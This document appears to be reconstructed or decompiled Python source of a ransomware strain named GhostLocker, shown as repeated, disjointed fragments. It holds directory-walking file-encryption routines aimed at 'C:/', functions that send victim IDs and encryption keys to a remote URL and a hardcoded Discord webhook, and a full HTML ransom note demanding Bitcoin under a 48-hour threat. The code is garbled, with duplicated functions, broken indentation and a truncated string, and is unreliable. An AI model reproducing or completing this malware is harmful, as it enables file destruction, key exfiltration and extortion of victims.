    def sendDB(id, key, pcname):
        data = {'id': id, 'key': key, 'pcname': pcname}
        response = requests.post(url, json=data)
        return response.json()


    def genexpr():
        i = 0
        while True:
            i = random.choice(letters)
            yield i


Code:

    def genexpr():
        i = 0
        while True:
            i = random.choice(letters)
            yield i

    def genexpr():
        i = 0
        while True:
            i = random.choice(letters)
            yield i


Code:

    def genexpr():
        i = 0
        while True:
            i = random.choice(letters)
            yield i

    def encrypt_file(filename, key):
        try:
            with open(filename, 'rb') as file:
                file_data = file.read()
            cipher = Fernet(key)
            encrypted_data = cipher.encrypt(file_data)
            new_filename = filename + '.ghost'
            with open(new_filename, 'wb') as file:
                file.write(encrypted_data)
            print('File "{}" encrypted and saved as "{}" successfully.'.format(filename, new_filename))
        except Exception as e:
            print('Error: {}'.format(str(e)))
        return None

    return encrypt_file

    def StartCrypt(directories, key):
        for dir in directories:
            for root, _, files in os.walk(dir):
                for filename in files:
                    f = os.path.join(root, filename)
                    encrypt_file(f, key)
        
    def encrypt_file(filename, key):
        with open(filename, 'rb') as f:
            content = f.read()
            cipher = AES.new(key, AES.MODE_EAX)
            cipher_text, tag = cipher.encrypt_and_digest(content)
            with open(filename + ".encrypted", 'wb') as f:
                f.write(cipher_text)
                f.write(tag)


# Python 3.10
def StartCrypt(directories, key):
    for dir in directories:
        for root, _, files in os.walk(dir):
            for filename in files:
                f = os.path.join(root, filename)
                encrypt_file(f, key)

def encrypt_file(filename, key):
    with open(filename, 'rb') as f:
        content = f.read()
        cipher = AES.new(key, AES.MODE_EAX)
        cipher_text, tag = cipher.encrypt_and_digest(content)
        with open(filename + '.encrypted', 'wb') as f:
            f.write(cipher_text)
            f.write(tag)
 def createRansomMSG(id):
    html_content = r'\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>GhostLocker</title>\n    <style>\n      * {\n        margin: 0;\n        padding: 0;\n      }\n\n      body {\n        font-family: "Montserrat", sans-serif, arial;\n        background-color: rgb(36, 36, 36);\n        color: white;\n      }\n\n      .Logo {\n        text-align: center;\n        padding: 1em;\n        background-color: rgb(26, 26, 26);\n        border-bottom: 1px solid red;\n      }\n\n      .Logo p {\n        font-style: italic;\n      }\n\n      .MainNote {\n        text-align: center;\n        padding: 2em;\n      }\n\n      .SecondaryNote {\n        text-align: center;\n        width: 40em;\n        margin: auto;\n      }\n\n      .SecondaryNote p {\n        margin-top: 1em;\n      }\n\n      .Contact {\n        text-align: center;\n        padding: 1em;\n        background-color: rgb(26, 26, 26);\n        max-width: 40em;\n        margin-left: auto;\n        margin-right: auto;\n        margin-top: 1em;\n        border: 1px solid red;\n        border-radius: 1em;\n      }\n\n      .DoNot {\n        text-align: center;\n        padding: 3em;\n        background-color: rgb(255, 65, 65);\n        max-width: 40em;\n        margin-left: auto;\n        margin-right: auto;\n        margin-top: 1em;\n        border: 1px solid rgb(255, 65, 65);\n        border-radius: 1em;\n      }\n\n      /* ADDITIONAL */\n      .Colored {\n        color: red;\n      }\n\n      .Marked {\n        background-color: red;\n      }\n\n      .Bold {\n        font-weight: 700;\n      }\n    </style>\n  </head>\n  <body>\n    <main>\n        <div class="Logo">\n            <h2>Ghost<span class="Colored">Locker</span> 👻🏴‍☠️</h2>\n            <p>We run shit because we can</p>\n        </div>\n        <div class="MainNote">\n            <h1>ALL YOUR IMPORTANT FILES ARE <span class="Marked">STOLEN AND ENCRYPTED!</span></h1>\n            <p>YOUR PERSONAL ENCRYPTION ID: ' + id + '</p>\n            <p><span class="Marked">CURRENT RANSOM AMOUNT:</span> 0.018 BTC</p>\n        </div>\n        <div class="SecondaryNote">\n            <p>All your files have been encrypted, don\'t attempt to recover it on your own as that will lead to them being permanently deleted, save your encryption ID and reach out to US via session and sending a message to the ID presented below to recover your files.</p>\n            <p>All of your important files have been stolen and encrypted with RSA-2048 and AES-128 military grade ciphers. That means that no matter how much you were to try, the only way to get your files back is working with us and following our demands.</p>\n            <p>You have 48 hours (2 days) to contact us. If you do not make an effort to contact us within that time-frame, the ransom amount will increase.</p>\n            <p>If you do not pay the ransom, your files will be destroyed forever.</p>\n        </div>\n        <div class="Contact">\n            <p class="Bold">You can contact us on the following</p>\n            <p>05e2fa380e1cd63a192b0753c16e56a4e305f24f3a547b036ce6c7d742ce853839 (SESSION)</p>\n            <p>Session can be downloaded at: <a href="https://getsession.org
    def sendWebhook(msg):
        content = dict(msg)
        r = requests.post('https://discord.com/api/webhooks/1154881026062045247/I9U9uy7p6oO99ZkVKn1VFgl_y0gqVfkEg3gNlYM9lXsgCy3Sv_hDz23VIYJPvnCSwaH0', data=content)
        return r



    def Config():
        __module__ = '__main__'
        __qualname__ = 'Config'
        directories = ['C:/']
        return None
    def Config():
        __module__ = '__main__'
        __qualname__ = 'Config'
        directories = ['C:/']
        return None